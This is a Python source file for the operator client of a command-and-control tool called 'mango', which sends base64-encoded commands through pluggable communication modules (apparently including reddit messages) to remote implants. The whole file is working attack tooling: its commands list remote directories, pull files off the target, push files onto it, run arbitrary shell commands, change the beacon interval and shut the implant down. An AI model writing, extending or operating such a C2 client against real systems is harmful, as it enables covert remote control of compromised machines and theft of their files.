#!/usr/bin/python3


from base64 import  b64encode, b64decode
import cmd
import configparser
import importlib
import os
import shlex
import sys
import time

from commands import commands

# Global definitions
SETTINGS_FILE = "settings.ini"
COMMS_DIR = "comms"


class client(cmd.Cmd):
    intro = "\nWelcome to the mango c2 client. Type help or ? to list commands.\n"
    prompt = '(mango)> '

    def __init__(self):
        self.params = {} # Init parameters
        self.classes = [] # Imported classes
        self.mods = {} # Initialized communications modules

        # Read settings into self.params
        config = configparser.ConfigParser()
        config.read(SETTINGS_FILE)
        sections = config.sections()
        for s in sections:
            self.params[s] = dict(config.items(s))

        # Define a few class variables
        # self.interval = int(self.params["core"]["default_interval"])
        self.platform = self.params["core"]["default_platform"]
        # self.next_beacon = int(time()) + self.interval
        # self.prev_beacon = 0
        
        # Dynamically import comms modules
        beacon_files = os.listdir(COMMS_DIR)
        for b in beacon_files:
            if (not b in ("__pycache__", "__init__.py", "template.py") and \
                    b.endswith(".py")):
                new_class = getattr(
                    importlib.import_module(COMMS_DIR + "." + b[:-3]), b[:-3])
                self.classes.append(new_class)

        # Initialize all comms classes with their respective params
        for c in self.classes:
            name = c.__name__
            self.mods[name] = c(self.params[name])

        super(client, self).__init__()

    def emptyline(self):
        """Do nothing for empty lines
        """
        pass

    def do_exit(self, line):
        """exit
        Quit the program"""
        sys.exit(0)
    
    def send_cmd(self, cmd):
        out = b64encode(cmd)
        print("Sending command...")
        try:
            self.mods[self.platform].send(
                self.mods[self.platform].target,
                "subject",
                out
            )
        except:
            print("ERROR: Command failed to send.")

    def do_receive(self, line):
        """receive
        Check for responses and print their outputs
        """
        messages = self.mods[self.platform].receive()

        if not messages:
            print("No responses found.")

        while messages:
            msg = b64decode(messages.pop())
            print(msg.decode("utf-8"))
            print("\n")

    def do_dir(self, line):
        """dir [directory]
        Get the contents of a directory"""
        args = shlex.split(line)
        if len(args) != 1:
            print("Exactly 1 argument is required.")
            return
        cmd = "DIR{}".format(args[0]).encode()
        self.send_cmd(cmd) 

    def do_get(self, line):
        """get [filename]
        Get the contents of a file"""
        args = shlex.split(line)
        if len(args) != 1:
            print("Exactly 1 argument is required.")
        cmd = "GET{}".format(args[0]).encode()
        self.send_cmd(cmd)

    def do_put(self, line):
        """put [srcfile] [destfile]
        Put a local file to a remote file"""
        # TODO there's a 10,000 character limit for messages on reddit
        args = shlex.split(line)
        print(args)
        if len(args) != 2:
            print("Exactly 2 arguments are required.")
            return

        if not os.path.isfile(args[0]):
            print("ERROR: File {} does not exist.".format(args[0]))
            return
        with open (args[0], "r") as f:
            data = f.read()
        
        cmd = "PUT{} {}".format(args[1], data).encode()
        self.send_cmd(cmd)

    def do_exe(self, line):
        """exe [cmd]
        Execute a shell command"""
        if not line:
            print("A command is required.")
        line = "EXE" + line
        self.send_cmd(line.encode())

    def do_die(self, line):
        """die
        Cause the server to exit"""
        self.send_cmd(b"DIE")

    def do_int(self, line):
        """int [interval]
        Set the beacon interval to a new value, in seconds"""
        args = shlex.split(line)
        if len(args) != 1:
            print("Exactly 1 argument is required.")
            return
        cmd = "INT{}".format(args[0]).encode()
        self.send_cmd(cmd) 


def main():
    test = client()
    test.cmdloop()


if __name__ == "__main__":
    main()
